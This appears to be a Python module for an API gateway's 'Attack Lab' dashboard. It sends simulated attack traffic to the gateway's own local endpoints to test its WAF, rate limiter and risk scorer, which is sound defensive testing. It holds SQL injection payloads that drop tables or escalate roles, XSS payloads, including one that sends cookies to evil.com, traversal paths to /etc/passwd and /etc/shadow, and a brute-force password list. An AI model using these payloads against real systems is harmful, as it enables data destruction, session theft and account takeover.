"""
gateway/detection/attack_sim.py
-------------------------------
Live attack simulation engine for the Attack Lab dashboard.

Generates real HTTP traffic against the gateway's own middleware stack so
every simulated request passes through the WAF, rate limiter, risk scorer,
and audit logger exactly like real traffic would. The dashboard streams the
resulting counters, risk samples, and threat events live over WebSocket.

Attack types:
  sqli            — SQL injection payloads in query strings / JSON bodies
  xss             — XSS payloads in query strings / headers
  path_traversal  — ../../ traversal payloads in the URL path
  bruteforce      — repeated failed logins against /auth/login
  flood           — high-volume authenticated requests (behaviour + ML)
"""

import asyncio
import logging
import random
import time
from collections import deque
from dataclasses import dataclass, field

import httpx

logger = logging.getLogger(__name__)

BASE_URL = "http://127.0.0.1:8000"
MAX_EVENTS = 80
MAX_RISK_SAMPLES = 200

# ── Attack definitions ────────────────────────────────────────────────────────

# NOTE: the WAF decodes JSON bodies before scanning, and it URL-decodes the
# request URL as well — gateway/middleware/waf.py:171 runs
# `unquote_plus(str(request.url))` before matching, so `union%20select` in a
# query string is caught exactly like `union select`. This comment previously
# claimed the opposite ("URL-encoded query params are NOT decoded by the
# regex"), which would have implied every query-string payload here was a
# waste of a request. Bodies and headers are still preferred, but for a
# different reason: they keep long attack strings out of the uvicorn access
# log and the audit trail's resource column.
SQLI_PAYLOADS = [
    {"body": {"query": "SELECT * FROM users WHERE id=1; DROP TABLE users;--"}},
    {"body": {"username": "admin' OR 1=1 --"}},
    {"body": {"email": "x@y.com'; UPDATE users SET role='admin'--"}},
    {"header": {"Referer": "http://evil.com/?q=1 UNION SELECT 1,2,3--"}},
    {"header": {"User-Agent": "sqlmap/1.5.8 UNION SELECT 1,2,3--"}},
]

XSS_PAYLOADS = [
    {"body": {"comment": "<script>alert(document.cookie)</script>"}},
    {"body": {"name": "<img src=x onerror=alert(1)>"}},
    {"body": {"message": "<script>fetch('//evil.com/' + document.cookie)</script>"}},
    {"header": {"User-Agent": "<script>alert(\"xss\")</script>"}},
]

TRAVERSAL_PAYLOADS = [
    "/api/v1/data/etc/passwd",                       # literal /etc/passwd — WAF matches even if %2f is normalized
    "/api/v1/data/etc/shadow",
    "/api/v1/data/..%2f..%2f..%2fetc%2fshadow",
    "/api/v1/data/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

BRUTE_PASSWORDS = [
    "password", "123456", "admin", "letmein", "qwerty", "welcome",
    "iloveyou", "monkey", "dragon", "password123",
]

FLOOD_PATHS = ["/api/v1/data/hello", "/api/v1/data/ping", "/api/v1/data/status"]

# ip-pool used to spoof distinct attackers (kept outside the user's own IP)
_IP_POOL = [
    "45.133.1.7", "91.240.118.40", "185.220.101.34", "194.36.144.9",
    "23.94.229.118", "103.105.199.12", "198.98.50.195", "82.65.37.10",
]


@dataclass
class AttackLab:
    running: bool = False
    attack_type: str | None = None
    start_ts: float = 0.0
    duration: int = 10
    intensity: float = 4.0
    total: int = 0
    blocked: int = 0
    allowed: int = 0
    errors: int = 0
    jwt: str | None = None
    risk_samples: deque = field(default_factory=lambda: deque(maxlen=MAX_RISK_SAMPLES))
    events: deque = field(default_factory=lambda: deque(maxlen=MAX_EVENTS))
    _task: asyncio.Task | None = None
    _ip_idx: int = 0
    # Run-scoped httpx client, shared by every request in one simulation run.
    _client: object | None = None

    # ── State helpers ─────────────────────────────────────────────────────────

    def snapshot(self) -> dict:
        return {
            "running": self.running,
            "attack_type": self.attack_type,
            "start_ts": self.start_ts,
            "duration": self.duration,
            "intensity": self.intensity,
            "total": self.total,
            "blocked": self.blocked,
            "allowed": self.allowed,
            "errors": self.errors,
            "elapsed": round(time.time() - self.start_ts, 1) if self.running else 0,
            "risk_samples": [
                {"t": round(s[0], 1), "score": s[1], "action": s[2]}
                for s in list(self.risk_samples)
            ],
            "events": list(self.events),
        }

    def _next_ip(self) -> str:
        self._ip_idx += 1
        return _IP_POOL[self._ip_idx % len(_IP_POOL)]

    def _push_event(self, threat_type: str, detail: str, risk: float, status: str):
        self.events.append({
            "time": time.strftime("%H:%M:%S"),
            "threat_type": threat_type,
            "detail": detail[:120],
            "risk_score": round(risk, 3),
            "status": status,
        })

    # ── Control ───────────────────────────────────────────────────────────────

    def start(self, attack_type: str, duration: int, intensity: float, jwt: str | None):
        if self.running:
            return
        self.running = True
        self.attack_type = attack_type
        self.duration = max(3, int(duration))
        self.intensity = max(1.0, min(float(intensity), 20.0))
        self.jwt = jwt
        self.start_ts = time.time()
        self.total = self.blocked = self.allowed = self.errors = 0
        self._client = None
        self.risk_samples.clear()
        self.events.clear()
        self._task = asyncio.create_task(self._run())
        logger.info("Attack Lab started: type=%s duration=%ds intensity=%.0f/s",
                    attack_type, self.duration, self.intensity)

    def stop(self):
        self.running = False
        if self._task:
            self._task.cancel()
            self._task = None
        # Release the shared connection pool. Left open, every run leaked one
        # pool's worth of sockets for the process lifetime.
        if self._client is not None:
            client, self._client = self._client, None
            try:
                asyncio.create_task(client.aclose())
            except RuntimeError as exc:
                # No running loop (interpreter shutdown) — the process is going
                # away and the sockets go with it, so this is genuinely benign.
                # Logged at DEBUG rather than silenced so "why is a connection
                # still open?" is answerable from the logs.
                logger.debug("Attack Lab client close skipped at shutdown: %s", exc)
        logger.info("Attack Lab stopped. total=%d blocked=%d allowed=%d",
                    self.total, self.blocked, self.allowed)

    async def _get_client(self):
        """Lazily create the run-scoped httpx client (see _send_one)."""
        if self._client is None:
            self._client = httpx.AsyncClient(
                timeout=5.0,
                limits=httpx.Limits(max_connections=40, max_keepalive_connections=20),
            )
        return self._client

    # ── Engine ────────────────────────────────────────────────────────────────

    async def _run(self):
        deadline = time.time() + self.duration
        delay = 1.0 / self.intensity
        try:
            while self.running and time.time() < deadline:
                batch = random.randint(1, 3)
                for _ in range(batch):
                    if not self.running:
                        break
                    await self._send_one()
                    await asyncio.sleep(delay / batch)
        except asyncio.CancelledError:
            pass
        finally:
            self.running = False
            if self._task is asyncio.current_task():
                self._task = None
            logger.info("Attack Lab finished. total=%d blocked=%d allowed=%d",
                        self.total, self.blocked, self.allowed)

    async def _send_one(self):
        typ = self.attack_type
        ip = self._next_ip()
        headers = {"X-Forwarded-For": ip}
        if self.jwt:
            headers["Authorization"] = f"Bearer {self.jwt}"
        url = f"{BASE_URL}/api/v1/data/hello"
        method = "GET"
        json_body = None
        params = None

        try:
            if typ == "sqli":
                payload = random.choice(SQLI_PAYLOADS)
                if "body" in payload:
                    json_body = payload["body"]
                if "header" in payload:
                    headers.update(payload["header"])
            elif typ == "xss":
                payload = random.choice(XSS_PAYLOADS)
                if "body" in payload:
                    json_body = payload["body"]
                if "header" in payload:
                    headers.update(payload["header"])
            elif typ == "path_traversal":
                url = f"{BASE_URL}{random.choice(TRAVERSAL_PAYLOADS)}"
            elif typ == "bruteforce":
                url = f"{BASE_URL}/auth/login"
                method = "POST"
                json_body = {
                    "email": "victim@example.com",
                    "password": random.choice(BRUTE_PASSWORDS),
                }
            elif typ == "flood":
                url = f"{BASE_URL}{random.choice(FLOOD_PATHS)}"
            else:
                json_body = {"query": "SELECT * FROM users WHERE 1=1; DROP TABLE x;--"}

            # One shared client for the whole run. A fresh AsyncClient per request
            # meant a new connection pool per request — roughly 1,200 of them in a
            # 60s run at 20 rps — so the simulator spent its time in TCP setup and
            # measured connection latency rather than gateway behaviour.
            client = await self._get_client()
            resp = await client.request(
                method, url, headers=headers, params=params, json=json_body,
            )
        except Exception:
            self.errors += 1
            return

        self.total += 1
        # Header parsing lives INSIDE the try now. float() on a non-numeric
        # X-Risk-Score used to raise out of a bare asyncio.create_task, which
        # kills the run with the traceback going nowhere and the UI still showing
        # "running" until the duration elapses.
        try:
            risk = float(resp.headers.get("X-Risk-Score", 0.15))
        except (TypeError, ValueError):
            risk = 0.15
        action = resp.headers.get("X-Risk-Action", "allow")
        waf_threat = resp.headers.get("X-WAF-Blocked", "")

        if waf_threat:
            self.blocked += 1
            self._push_event(waf_threat, f"WAF blocked {typ} payload", risk, "blocked")
        elif resp.status_code >= 400:
            self.blocked += 1
            if resp.status_code == 429:
                self._push_event("rate_limited", f"rate limit hit ({typ})", risk, "blocked")
            elif resp.status_code in (401, 403):
                self._push_event("access_denied", f"{typ} rejected ({resp.status_code})", risk, "blocked")
            else:
                self._push_event("blocked", f"{typ} {resp.status_code}", risk, "blocked")
        else:
            self.allowed += 1

        self.risk_samples.append((time.time() - self.start_ts, risk, action))


# Module-level singleton
lab = AttackLab()
